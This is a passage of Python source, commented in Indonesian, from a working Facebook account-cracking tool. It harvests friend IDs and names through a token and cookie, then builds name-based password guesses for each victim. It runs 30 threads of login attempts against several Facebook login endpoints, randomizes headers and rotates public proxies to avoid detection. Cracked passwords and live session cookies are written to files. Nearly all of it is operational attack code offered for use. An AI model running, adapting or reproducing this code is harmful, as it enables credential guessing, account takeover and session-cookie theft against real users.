                a = input(f'└── masukan id : ')
                try:
                        params = {
                        "access_token": token,
                        "fields": "name,friends.fields(id,name,birthday)"
                        }
                        b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
                        for c in b["friends"]["data"]:
                                id.append(c["id"]+"|"+c["name"])
                        print(f'└── sukses mgumpulkan {H}{(len(id))}{x} user')
                        setting()
                except Exception as e:
                        print(e)
                        print(f'{P} KONTOLL ASUUU')

#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		#print(f'{xxx}─────────────────────────────')
		kumpulkan = int(input(f'└── Mau Berapa Id? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'└── Masukkan Id Yang Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print(f"└── sukses mengumpulkan {H}{(len(id))} {x}user")
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
#----------[ MENU-IDZ ]----------#		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	print("")
	print(f'{kun}└──[{puti} 01. Validate ')
	print(f'{kun}└──[{puti} 02. Reguler ')
	print(f'{kun}└──[{puti} 03. Asyinc ')      
	print(f"{kun}╭────────────────────────────────────────────{puti}") 
	CYXIEON_METHODE = input(f'{kun}└──[{puti} Input method : ')
	if CYXIEON_METHODE in ['1','01']:
	   method.append('validate')  
	elif CYXIEON_METHODE in ['2','02']:
	   method.append('reguler')       
	elif CYXIEON_METHODE in ['3','03']:
	   method.append('asyinc')
	else:
		method.append('validate')
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} Tambahkan pw manual (y/t) ')
	print(f"{kun}╭────────────────────────────────────────────{puti}") 	
	passwtamb = input(f'{kun}└──[{puti} Input : ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     print(f"{kun}╭────────────────────────────────────────────{puti}")
		     sandiku = input(f'{kun}└──[{puti} Input Pw : ')
		     sandimu = sandiku.split(',')
		     for sandixnxx in sandimu:
		         sandina.append(sandixnxx)		 
	else:
	    sandine.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} WAITING ')
	print(f"{kun}─────────────────────────────────────────────{puti}")
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				idf,namamu_ku_simpan = _gabutz_ster_.split('|')[0],_gabutz_ster_.split('|')[1].lower()
				frestile = namamu_ku_simpan.split(" ")[0]
				pwx = []
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						pass
					else:
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'123456789')
						pwx.append(frestile+'321')
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
				else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
				if 'ya' in sandine: 
					for sandi_kita in sandina:
						pwx.append(sandi_kita)
				else:pass
				if 'validate' in method:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.prod.facebook.com')
				elif 'reguler' in method:
				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
				elif 'asyinc' in method:
				    pemuda_tersakiti.submit(crackasyinc,idf,pwx,'m.alpha.facebook.com')
				else:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
				    
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} OK {hijo}: %s'%(ok))
	print(f'{kun}└──[{puti} CP {kun}: %s'%(cp))
	print(f"{kun}─────────────────────────────────────────────{puti}")
	
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["🥸",])
	prog.update(des,description=f"\r {emot}(HACKING)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			ua = rc(ugen)
			#ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
			link = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next": "https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': url,
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': f'https://'+url,
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(rr(1,5))}',
		'viewport-width': f'{str(rr(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://{url}/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
	 )
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
				print(f"⌲ Password: {hijo}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
				print(f'{hijo}{ua}')
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"\n⌲ User ID: {kun}{idf}{puti}")
				print(f"⌲ Password: {kun}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f'{kun}{ua}')
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-REGULER ]----------#	
def crackreguler(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} ( REGULER ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt').text
			open('socks4.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks5://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"]) 		
			ses.headers.update(
			{
			"Host":url,
			"upgrade-insecure-requests":"1",
			"user-agent":ua,
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"dnt":f"{str(rr(1,9))}",
			"x-requested-with":"mark.via.gp",
			"sec-fetch-site":"same-origin",
			"sec-fetch-mode":"cors",
			"sec-fetch-user":"empty",
			"sec-fetch-dest":"document",
			"referer":f"https://{url}/",
			"accept-encoding":"gzip, deflate br",
			"accept-language":"en-US;q=0.8,en;q=0.7"
			}
		)
			link = ses.get('https://m.facebook.com/login/?email='+idf).text
			date = ({'lsd':re.search('name="lsd" value="(.*?)"', str(link)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw})
			ses.headers.update(
			{
			'Host': url,
			'cache-control': 'max-age=0',
			'upgrade-insecure-requests': '1',
			'origin': 'https://'+url,
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-user': 'empty',
			'sec-fetch-dest': 'document',
			'referer': f'https://{url}/login/?email='+idf,
			'accept-encoding':'gzip, deflate br',
			'accept-language': 'en-US;q=0.8,en;q=0.7'
			}
		)
			po = ses.post(f"https://{url}/login/login/device-based/regular/login/?shbl=1&refsrc=deprecated", data=date,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
				print(f"⌲ Password: {hijo}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
				print(f'{hijo}{ua}')
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"\n⌲ User ID: {kun}{idf}{puti}")
				print(f"⌲ Password: {kun}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f'{kun}{ua}')
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-ASYINC ]----------#	
def crackasyinc(idf,pwx):
  global loop,ok,cp
  ses = requests.Session()
  rr = random.randint
  rc = random.choice
  emot = rc(["😝","😜","🤪"])
  prog.update(des,description=f"\r {emot} ( ASYINC ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
  prog.advance(des)
  for pw in pwx:
    try:
      proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text
      open('http.txt','w').write(proxs)
      nip = rc(proxs)
      proxs = {'http': 'socks4://'+nip}
      ua = rc(ugen)
      ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
      link = ses.get('https://m.facebook.com/login/?email='+idf+'&app_id=469724967619195&api_key=469724967619195&auth_token=e30a80f9070ee8fc49a23998b8eb9b54&next=https%3A%2F%2m.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D469724967619195%26cbt%3D1697161758144%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2c5574a5c040a8%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%26client_id%3D469724967619195%26display%3Dtouch%26domain%3Dpage.palm.tech%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpage.palm.tech%252Fpalm-id%252F%2523%252Flogin%253Fclient-id%253Ditel-global%2526callbackUrl%253Dhttp%25253A%25252F%25252Fclub.itel-life.com%25252F%2526language%253Den_US%2526brandId%253Ditel%26locale%3Den_US%26logger_id%3Df34548c36d16038%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df18f150b67c9dac%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%2526frame%253Df18a7b805567f3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cuser_likes%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&li=VKIoZfrCsErYtA-k75tkXpQ4&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df18f150b67c9dac%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener%26frame%3Df18a7b805567f3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&e=1348092&skip_api_login=1&shbl=1&locale2=id_ID&refsrc=deprecated&_rdr')
      date = {
      'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
      'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
      'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
      'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
      'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
      'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
      'email': idf,
      'pass': pw,
      'login': 'Masuk',
      'bi_xrwh': '0',
        } 
      headers = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'dpr': '2.75',
    'referer': 'https://m.facebook.com/?refid=9&ref=dbl',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"MI 8 Lite"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
    
      params = {'api_key': '469724967619195','auth_token': 'e30a80f9070ee8fc49a23998b8eb9b54','skip_api_login': '1','signed_next': '1','next': 'https://m.facebook.com/v3.2/dialog/oauth?app_id=469724967619195&cbt=1697161758144&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2c5574a5c040a8%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener&client_id=469724967619195&display=touch&domain=page.palm.tech&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fpage.palm.tech%2Fpalm-id%2F%23%2Flogin%3Fclient-id%3Ditel-global%26callbackUrl%3Dhttp%253A%252F%252Fclub.itel-life.com%252F%26language%3Den_US%26brandId%3Ditel&locale=en_US&logger_id=f34548c36d16038&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df18f150b67c9dac%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener%26frame%3Df18a7b805567f3c&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=email%2Cuser_likes&sdk=joey&version=v3.2&ret=login&fbapp_pres=0&tp=unspecified','refsrc': 'deprecated','app_id': '469724967619195','cancel': 'https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#cb=f18f150b67c9dac&domain=page.palm.tech&is_canvas=false&origin=https%3A%2F%2Fpage.palm.tech%2Ff2751a06ed883e4&relation=opener&frame=f18a7b805567f3c&error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied','lwv': '100','locale2': 'id_ID','refid': '9',}
      po = ses.post('https://m.facebook.com/login/device-based/regular/login/',params=params,data=date,headers=head,allow_redirects=False,proxies=proxs)
      if "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki = po.cookies.get_dict()
        kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
        print(f"{kun}╭────────────────────────────╮{puti}")
        tree = Tree("")
        tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
        tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
        print(f"{kun}╰────────────────────────────╯{puti}")
        prints(tree)
        open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
        open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
        break	
      elif "checkpoint" in po.cookies.get_dict().keys():
        print(f"{kun}╭────────────────────────────╮{puti}")
        tree = Tree("")
        tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
        tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
        print(f"{kun}╰────────────────────────────╯{puti}")
        prints(tree)
        open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        akune.append(idf+'|'+pw)
        ceker(idf,pw)
        cp+=1
        break	
      else:
        continue
    except requests.exceptions.ConnectionError:time.sleep(31)
  loop+=1

#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 12; CPH2089 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
